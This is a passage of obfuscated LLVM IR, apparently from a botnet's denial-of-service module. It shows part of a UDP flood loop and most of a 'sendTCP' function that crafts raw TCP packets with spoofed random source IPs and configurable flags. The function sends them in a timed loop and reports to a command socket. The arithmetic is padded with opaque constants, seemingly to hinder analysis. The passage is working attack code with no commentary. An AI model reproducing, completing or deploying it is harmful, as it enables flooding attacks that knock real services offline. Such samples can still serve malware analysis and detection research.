  %231 = trunc i32 %230 to i16
  %232 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %233 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.2* %233 to %struct.anon.3*
  %235 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %234, i32 0, i32 1
  store i16 %231, i16* %235, align 2
  %236 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.2* %237 to %struct.anon.3*
  %239 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %238, i32 0, i32 3
  store i16 0, i16* %239, align 2
  %240 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %241 = bitcast %struct.udphdr* %240 to i8*
  %242 = getelementptr inbounds i8, i8* %241, i64 8
  %243 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %242, i32 %243)
  %244 = bitcast i8* %183 to i16*
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 2
  %247 = load i16, i16* %246, align 2
  %248 = zext i16 %247 to i32
  %249 = call zeroext i16 @csum(i16* %244, i32 %248)
  %250 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i32 0, i32 7
  store i16 %249, i16* %251, align 2
  %252 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %253 = load i32, i32* %9, align 4
  %254 = sub i32 %252, 938443032
  %255 = add i32 %254, %253
  %256 = add i32 %255, 938443032
  %257 = add nsw i32 %252, %253
  store i32 %256, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %258

; <label>:258:                                    ; preds = %311, %310, %229
  br label %259

; <label>:259:                                    ; preds = %258
  %260 = load i32, i32* %19, align 4
  %261 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %262 = call i64 @sendto(i32 %260, i8* %183, i64 %180, i32 0, %struct.sockaddr* %261, i32 16)
  %263 = call i32 @rand_cmwc()
  %264 = trunc i32 %263 to i16
  %265 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  %267 = bitcast %union.anon.2* %266 to %struct.anon.3*
  %268 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %267, i32 0, i32 0
  store i16 %264, i16* %268, align 2
  %269 = load i32, i32* %8, align 4
  %270 = icmp eq i32 %269, 0
  br i1 %270, label %271, label %273

; <label>:271:                                    ; preds = %259
  %272 = call i32 @rand_cmwc()
  br label %278

; <label>:273:                                    ; preds = %259
  %274 = load i32, i32* %8, align 4
  %275 = trunc i32 %274 to i16
  %276 = call zeroext i16 @htons(i16 zeroext %275) #13
  %277 = zext i16 %276 to i32
  br label %278

; <label>:278:                                    ; preds = %273, %271
  %279 = phi i32 [ %272, %271 ], [ %277, %273 ]
  %280 = trunc i32 %279 to i16
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 0
  %283 = bitcast %union.anon.2* %282 to %struct.anon.3*
  %284 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %283, i32 0, i32 1
  store i16 %280, i16* %284, align 2
  %285 = call i32 @rand_cmwc()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 3
  store i16 %286, i16* %288, align 4
  %289 = load i32, i32* %22, align 4
  %290 = call i32 @getRandomIP(i32 %289)
  %291 = call i32 @htonl(i32 %290) #13
  %292 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %293 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %292, i32 0, i32 8
  store i32 %291, i32* %293, align 4
  %294 = bitcast i8* %183 to i16*
  %295 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 2
  %297 = load i16, i16* %296, align 2
  %298 = zext i16 %297 to i32
  %299 = call zeroext i16 @csum(i16* %294, i32 %298)
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 7
  store i16 %299, i16* %301, align 2
  %302 = load i32, i32* %27, align 4
  %303 = load i32, i32* %14, align 4
  %304 = icmp eq i32 %302, %303
  br i1 %304, label %305, label %311

; <label>:305:                                    ; preds = %278
  %306 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %307 = load i32, i32* %26, align 4
  %308 = icmp sgt i32 %306, %307
  br i1 %308, label %309, label %310

; <label>:309:                                    ; preds = %305
  br label %318

; <label>:310:                                    ; preds = %305
  store i32 0, i32* %27, align 4
  br label %258

; <label>:311:                                    ; preds = %278
  %312 = load i32, i32* %27, align 4
  %313 = sub i32 0, %312
  %314 = sub i32 0, 1
  %315 = add i32 %313, %314
  %316 = sub i32 0, %315
  %317 = add i32 %312, 1
  store i32 %316, i32* %27, align 4
  br label %258

; <label>:318:                                    ; preds = %309
  %319 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %319)
  br label %320

; <label>:320:                                    ; preds = %318, %129, %121, %116, %69, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %511

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i32 0, i32 0))
  br label %511

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.36, i32 0, i32 0))
  br label %511

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %88

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = add i32 32, -1766947779
  %69 = sub i32 %68, %67
  %70 = sub i32 %69, -1766947779
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = sub i32 %72, 601279241
  %74 = sub i32 %73, 1
  %75 = add i32 %74, 601279241
  %76 = sub nsw i32 %72, 1
  %77 = xor i32 %75, -1
  %78 = and i32 -2090214499, %77
  %79 = xor i32 -2090214499, -1
  %80 = and i32 %75, %79
  %81 = xor i32 -1, -1
  %82 = and i32 %81, -2090214499
  %83 = and i32 -1, %79
  %84 = or i32 %78, %80
  %85 = or i32 %82, %83
  %86 = xor i32 %84, %85
  %87 = xor i32 %75, -1
  store i32 %86, i32* %19, align 4
  br label %88

; <label>:88:                                     ; preds = %66, %65
  %89 = load i32, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = sub i64 0, 40
  %92 = sub i64 0, %90
  %93 = add i64 %91, %92
  %94 = sub i64 0, %93
  %95 = add i64 40, %90
  %96 = call i8* @llvm.stacksave()
  store i8* %96, i8** %20, align 8
  %97 = alloca i8, i64 %94, align 16
  %98 = bitcast i8* %97 to %struct.iphdr*
  store %struct.iphdr* %98, %struct.iphdr** %21, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %100 = bitcast %struct.iphdr* %99 to i8*
  %101 = getelementptr i8, i8* %100, i64 20
  %102 = bitcast i8* %101 to %struct.tcphdr*
  store %struct.tcphdr* %102, %struct.tcphdr** %22, align 8
  %103 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %105 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 4
  %107 = load i32, i32* %19, align 4
  %108 = call i32 @getRandomIP(i32 %107)
  %109 = call i32 @htonl(i32 %108) #13
  %110 = load i32, i32* %13, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 20, -6988568059710191412
  %113 = add i64 %112, %111
  %114 = add i64 %113, -6988568059710191412
  %115 = add i64 20, %111
  %116 = trunc i64 %114 to i32
  call void @makeIPPacket(%struct.iphdr* %103, i32 %106, i32 %109, i8 zeroext 6, i32 %116)
  %117 = call i32 @rand_cmwc()
  %118 = trunc i32 %117 to i16
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon.0* %120 to %struct.anon.1*
  %122 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %121, i32 0, i32 0
  store i16 %118, i16* %122, align 4
  %123 = call i32 @rand_cmwc()
  %124 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon.0* %125 to %struct.anon.1*
  %127 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %126, i32 0, i32 2
  store i32 %123, i32* %127, align 4
  %128 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.0* %129 to %struct.anon.1*
  %131 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %130, i32 0, i32 3
  store i32 0, i32* %131, align 4
  %132 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %132, i32 0, i32 0
  %134 = bitcast %union.anon.0* %133 to %struct.anon.1*
  %135 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %134, i32 0, i32 4
  %136 = load i16, i16* %135, align 4
  %137 = xor i16 %136, -1
  %138 = xor i16 -241, -1
  %139 = xor i16 16258, -1
  %140 = or i16 %137, %138
  %141 = or i16 16258, %139
  %142 = xor i16 %140, -1
  %143 = and i16 %142, %141
  %144 = and i16 %136, -241
  %145 = and i16 %143, 80
  %146 = xor i16 %143, 80
  %147 = or i16 %145, %146
  %148 = or i16 %143, 80
  store i16 %147, i16* %135, align 4
  %149 = load i8*, i8** %12, align 8
  %150 = call i32 @strcmp(i8* %149, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.37, i32 0, i32 0)) #10
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %258, label %152

; <label>:152:                                    ; preds = %88
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon.0* %154 to %struct.anon.1*
  %156 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %155, i32 0, i32 4
  %157 = load i16, i16* %156, align 4
  %158 = xor i16 %157, -1
  %159 = xor i16 -513, -1
  %160 = xor i16 280, -1
  %161 = or i16 %158, %159
  %162 = or i16 280, %160
  %163 = xor i16 %161, -1
  %164 = and i16 %163, %162
  %165 = and i16 %157, -513
  %166 = xor i16 %164, -1
  %167 = xor i16 512, -1
  %168 = xor i16 9487, -1
  %169 = and i16 %166, 9487
  %170 = and i16 %164, %168
  %171 = and i16 %167, 9487
  %172 = and i16 512, %168
  %173 = or i16 %169, %170
  %174 = or i16 %171, %172
  %175 = xor i16 %173, %174
  %176 = or i16 %166, %167
  %177 = xor i16 %176, -1
  %178 = or i16 9487, %168
  %179 = and i16 %177, %178
  %180 = or i16 %175, %179
  %181 = or i16 %164, 512
  store i16 %180, i16* %156, align 4
  %182 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %182, i32 0, i32 0
  %184 = bitcast %union.anon.0* %183 to %struct.anon.1*
  %185 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %184, i32 0, i32 4
  %186 = load i16, i16* %185, align 4
  %187 = xor i16 %186, -1
  %188 = xor i16 -1025, -1
  %189 = xor i16 8717, -1
  %190 = or i16 %187, %188
  %191 = or i16 8717, %189
  %192 = xor i16 %190, -1
  %193 = and i16 %192, %191
  %194 = and i16 %186, -1025
  %195 = and i16 %193, 1024
  %196 = xor i16 %193, 1024
  %197 = or i16 %195, %196
  %198 = or i16 %193, 1024
  store i16 %197, i16* %185, align 4
  %199 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon.0* %200 to %struct.anon.1*
  %202 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = xor i16 %203, -1
  %205 = xor i16 -257, -1
  %206 = xor i16 -23948, -1
  %207 = or i16 %204, %205
  %208 = or i16 -23948, %206
  %209 = xor i16 %207, -1
  %210 = and i16 %209, %208
  %211 = and i16 %203, -257
  %212 = and i16 %210, 256
  %213 = xor i16 %210, 256
  %214 = or i16 %212, %213
  %215 = or i16 %210, 256
  store i16 %214, i16* %202, align 4
  %216 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.0* %217 to %struct.anon.1*
  %219 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = xor i16 -4097, -1
  %222 = xor i16 %220, %221
  %223 = and i16 %222, %220
  %224 = and i16 %220, -4097
  %225 = xor i16 %223, -1
  %226 = xor i16 4096, -1
  %227 = xor i16 17908, -1
  %228 = and i16 %225, 17908
  %229 = and i16 %223, %227
  %230 = and i16 %226, 17908
  %231 = and i16 4096, %227
  %232 = or i16 %228, %229
  %233 = or i16 %230, %231
  %234 = xor i16 %232, %233
  %235 = or i16 %225, %226
  %236 = xor i16 %235, -1
  %237 = or i16 17908, %227
  %238 = and i16 %236, %237
  %239 = or i16 %234, %238
  %240 = or i16 %223, 4096
  store i16 %239, i16* %219, align 4
  %241 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon.0* %242 to %struct.anon.1*
  %244 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = xor i16 %245, -1
  %247 = xor i16 -2049, -1
  %248 = xor i16 -1827, -1
  %249 = or i16 %246, %247
  %250 = or i16 -1827, %248
  %251 = xor i16 %249, -1
  %252 = and i16 %251, %250
  %253 = and i16 %245, -2049
  %254 = and i16 %252, 2048
  %255 = xor i16 %252, 2048
  %256 = or i16 %254, %255
  %257 = or i16 %252, 2048
  store i16 %256, i16* %244, align 4
  br label %397

; <label>:258:                                    ; preds = %88
  %259 = load i8*, i8** %12, align 8
  %260 = call i8* @strtok(i8* %259, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %260, i8** %23, align 8
  br label %261

; <label>:261:                                    ; preds = %394, %258
  %262 = load i8*, i8** %23, align 8
  %263 = icmp ne i8* %262, null
  br i1 %263, label %264, label %396

; <label>:264:                                    ; preds = %261
  %265 = load i8*, i8** %23, align 8
  %266 = call i32 @strcmp(i8* %265, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %282, label %268

; <label>:268:                                    ; preds = %264
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 0
  %271 = bitcast %union.anon.0* %270 to %struct.anon.1*
  %272 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %271, i32 0, i32 4
  %273 = load i16, i16* %272, align 4
  %274 = xor i16 -513, -1
  %275 = xor i16 %273, %274
  %276 = and i16 %275, %273
  %277 = and i16 %273, -513
  %278 = and i16 %276, 512
  %279 = xor i16 %276, 512
  %280 = or i16 %278, %279
  %281 = or i16 %276, 512
  store i16 %280, i16* %272, align 4
  br label %394

; <label>:282:                                    ; preds = %264
  %283 = load i8*, i8** %23, align 8
  %284 = call i32 @strcmp(i8* %283, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.40, i32 0, i32 0)) #10
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %316, label %286

; <label>:286:                                    ; preds = %282
  %287 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 0
  %289 = bitcast %union.anon.0* %288 to %struct.anon.1*
  %290 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %289, i32 0, i32 4
  %291 = load i16, i16* %290, align 4
  %292 = xor i16 %291, -1
  %293 = xor i16 -1025, -1
  %294 = xor i16 -21936, -1
  %295 = or i16 %292, %293
  %296 = or i16 -21936, %294
  %297 = xor i16 %295, -1
  %298 = and i16 %297, %296
  %299 = and i16 %291, -1025
  %300 = xor i16 %298, -1
  %301 = xor i16 1024, -1
  %302 = xor i16 17660, -1
  %303 = and i16 %300, 17660
  %304 = and i16 %298, %302
  %305 = and i16 %301, 17660
  %306 = and i16 1024, %302
  %307 = or i16 %303, %304
  %308 = or i16 %305, %306
  %309 = xor i16 %307, %308
  %310 = or i16 %300, %301
  %311 = xor i16 %310, -1
  %312 = or i16 17660, %302
  %313 = and i16 %311, %312
  %314 = or i16 %309, %313
  %315 = or i16 %298, 1024
  store i16 %314, i16* %290, align 4
  br label %393

; <label>:316:                                    ; preds = %282
  %317 = load i8*, i8** %23, align 8
  %318 = call i32 @strcmp(i8* %317, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.41, i32 0, i32 0)) #10
  %319 = icmp ne i32 %318, 0
  br i1 %319, label %338, label %320

; <label>:320:                                    ; preds = %316
  %321 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %322 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %321, i32 0, i32 0
  %323 = bitcast %union.anon.0* %322 to %struct.anon.1*
  %324 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %323, i32 0, i32 4
  %325 = load i16, i16* %324, align 4
  %326 = xor i16 %325, -1
  %327 = xor i16 -257, -1
  %328 = xor i16 149, -1
  %329 = or i16 %326, %327
  %330 = or i16 149, %328
  %331 = xor i16 %329, -1
  %332 = and i16 %331, %330
  %333 = and i16 %325, -257
  %334 = and i16 %332, 256
  %335 = xor i16 %332, 256
  %336 = or i16 %334, %335
  %337 = or i16 %332, 256
  store i16 %336, i16* %324, align 4
  br label %392

; <label>:338:                                    ; preds = %316
  %339 = load i8*, i8** %23, align 8
  %340 = call i32 @strcmp(i8* %339, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %341 = icmp ne i32 %340, 0
  br i1 %341, label %356, label %342

; <label>:342:                                    ; preds = %338
  %343 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %344 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %343, i32 0, i32 0
  %345 = bitcast %union.anon.0* %344 to %struct.anon.1*
  %346 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %345, i32 0, i32 4
  %347 = load i16, i16* %346, align 4
  %348 = xor i16 -4097, -1
  %349 = xor i16 %347, %348
  %350 = and i16 %349, %347
  %351 = and i16 %347, -4097
  %352 = and i16 %350, 4096
  %353 = xor i16 %350, 4096
  %354 = or i16 %352, %353
  %355 = or i16 %350, 4096
  store i16 %354, i16* %346, align 4
  br label %391

; <label>:356:                                    ; preds = %338
  %357 = load i8*, i8** %23, align 8
  %358 = call i32 @strcmp(i8* %357, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0)) #10
  %359 = icmp ne i32 %358, 0
  br i1 %359, label %386, label %360

; <label>:360:                                    ; preds = %356
  %361 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 0
  %363 = bitcast %union.anon.0* %362 to %struct.anon.1*
  %364 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = xor i16 -2049, -1
  %367 = xor i16 %365, %366
  %368 = and i16 %367, %365
  %369 = and i16 %365, -2049
  %370 = xor i16 %368, -1
  %371 = xor i16 2048, -1
  %372 = xor i16 10432, -1
  %373 = and i16 %370, 10432
  %374 = and i16 %368, %372
  %375 = and i16 %371, 10432
  %376 = and i16 2048, %372
  %377 = or i16 %373, %374
  %378 = or i16 %375, %376
  %379 = xor i16 %377, %378
  %380 = or i16 %370, %371
  %381 = xor i16 %380, -1
  %382 = or i16 10432, %372
  %383 = and i16 %381, %382
  %384 = or i16 %379, %383
  %385 = or i16 %368, 2048
  store i16 %384, i16* %364, align 4
  br label %390

; <label>:386:                                    ; preds = %356
  %387 = load i32, i32* @mainCommSock, align 4
  %388 = load i8*, i8** %23, align 8
  %389 = call i32 (i32, i8*, ...) @sockprintf(i32 %387, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.44, i32 0, i32 0), i8* %388)
  br label %390

; <label>:390:                                    ; preds = %386, %360
  br label %391

; <label>:391:                                    ; preds = %390, %342
  br label %392

; <label>:392:                                    ; preds = %391, %320
  br label %393

; <label>:393:                                    ; preds = %392, %286
  br label %394

; <label>:394:                                    ; preds = %393, %268
  %395 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %395, i8** %23, align 8
  br label %261

; <label>:396:                                    ; preds = %261
  br label %397

; <label>:397:                                    ; preds = %396, %152
  %398 = call i32 @rand_cmwc()
  %399 = trunc i32 %398 to i16
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon.0* %401 to %struct.anon.1*
  %403 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %402, i32 0, i32 5
  store i16 %399, i16* %403, align 2
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon.0* %405 to %struct.anon.1*
  %407 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %406, i32 0, i32 6
  store i16 0, i16* %407, align 4
  %408 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 0
  %410 = bitcast %union.anon.0* %409 to %struct.anon.1*
  %411 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %410, i32 0, i32 7
  store i16 0, i16* %411, align 2
  %412 = load i32, i32* %9, align 4
  %413 = icmp eq i32 %412, 0
  br i1 %413, label %414, label %416

; <label>:414:                                    ; preds = %397
  %415 = call i32 @rand_cmwc()
  br label %421

; <label>:416:                                    ; preds = %397
  %417 = load i32, i32* %9, align 4
  %418 = trunc i32 %417 to i16
  %419 = call zeroext i16 @htons(i16 zeroext %418) #13
  %420 = zext i16 %419 to i32
  br label %421

; <label>:421:                                    ; preds = %416, %414
  %422 = phi i32 [ %415, %414 ], [ %420, %416 ]
  %423 = trunc i32 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon.0* %425 to %struct.anon.1*
  %427 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %426, i32 0, i32 1
  store i16 %423, i16* %427, align 2
  %428 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %429 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %430 = call zeroext i16 @tcpcsum(%struct.iphdr* %428, %struct.tcphdr* %429)
  %431 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 0
  %433 = bitcast %union.anon.0* %432 to %struct.anon.1*
  %434 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %433, i32 0, i32 6
  store i16 %430, i16* %434, align 4
  %435 = bitcast i8* %97 to i16*
  %436 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 2
  %438 = load i16, i16* %437, align 2
  %439 = zext i16 %438 to i32
  %440 = call zeroext i16 @csum(i16* %435, i32 %439)
  %441 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 7
  store i16 %440, i16* %442, align 2
  %443 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %444 = load i32, i32* %10, align 4
  %445 = sub i32 %443, 532840084
  %446 = add i32 %445, %444
  %447 = add i32 %446, 532840084
  %448 = add nsw i32 %443, %444
  store i32 %447, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %449

; <label>:449:                                    ; preds = %502, %501, %421
  br label %450

; <label>:450:                                    ; preds = %449
  %451 = load i32, i32* %17, align 4
  %452 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %453 = call i64 @sendto(i32 %451, i8* %97, i64 %94, i32 0, %struct.sockaddr* %452, i32 16)
  %454 = load i32, i32* %19, align 4
  %455 = call i32 @getRandomIP(i32 %454)
  %456 = call i32 @htonl(i32 %455) #13
  %457 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 8
  store i32 %456, i32* %458, align 4
  %459 = call i32 @rand_cmwc()
  %460 = trunc i32 %459 to i16
  %461 = load %struct.iphdr*, %struct.iphdr** %21, align 8
